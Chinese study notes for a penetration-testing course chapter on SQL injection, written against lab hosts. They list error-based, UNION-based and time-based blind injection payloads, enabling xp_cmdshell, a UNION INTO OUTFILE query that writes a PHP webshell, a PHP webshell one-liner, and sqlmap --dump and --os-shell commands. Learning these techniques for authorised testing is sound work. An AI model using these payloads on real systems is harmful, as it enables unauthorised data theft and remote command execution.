本篇对应教材第10章，主要内容“SQL数据库基础”、“SQL注入”、“自动执行代码”，记录使用工具和命令

## 10.1 SQl及数据库基础

### 10.1.2 数据库基础

mysql登录数据库

```python
mysql -u root -p'root' -h 192.168.50.16 -P 3306
```

查看数据库版本

```python
select version();
```

查看系统用户

```python
select system_user();
```

查看数据库名

```python
show databases;
```

查看具体表中数据

```python
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```

mssql登录

```python
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

查看版本

```python
SELECT @@version;
```

查看数据库名

```python
SELECT name FROM sys.databases;
```

查看表名

```python
SELECT * FROM offsec.information_schema.tables;
```

查看具体表内容

```python
select * from offsec.dbo.users;
```

## 10.2 SQl注入

### 10.2.1 基于报错的sql注入

例子

```python
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

用户名输入

```python
offsec' OR 1=1 -- //
```

执行的sql语句是

```python
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
```

可以绕过密码登录成功

一般先用单引号测试

```python
offsec'
```

有报错信息可以尝试注入，获得数据库版本

```python
' or 1=1 in (select @@version) -- //
```

查询表中数据

```python
' OR 1=1 in (SELECT * FROM users) -- //
```

如果报错尝试查单列

```python
' or 1=1 in (SELECT password FROM users) -- //
```

查执行用户

```python
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

### 10.2.2 基于联合查询的SQL注入

例如

```python
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

输入

```python
' ORDER BY 1-- //
```

提示报错或者出现列数，比如6

```python
%' UNION SELECT database(), user(), @@version, null, null -- //
```

联合查询会执行后面的查询依据，但是数据类型需要与原来字段一致，否则现实不出来，如果不一致可以改变位置

```python
' UNION SELECT null, null, database(), user(), @@version  -- //
```

```python
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

```python
' UNION SELECT null, username, password, description, null FROM users -- //
```

查表明、字段名、查数据均可

### 10.2.3 盲注

不报错也没有回显，可以基于时间盲注

```python
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

返回真，再用sleep函数做判断

```python
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

## 10.3 自动执行代码

### 10.3.1 代码执行

mssql执行命令

```python
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami';
```

联合查询webshell写入

```python
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

php webshell

```python
<? system($_REQUEST['cmd']); ?>
```

### 10.3.2 自动化

sqlmap（-p 参数）

判断注入

```python
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
```

读取数据

```python
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
```

抓包注入

```python
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```

更多更新资料（微信公众号：TopRedTeam）

![](./qrcode.jpg)
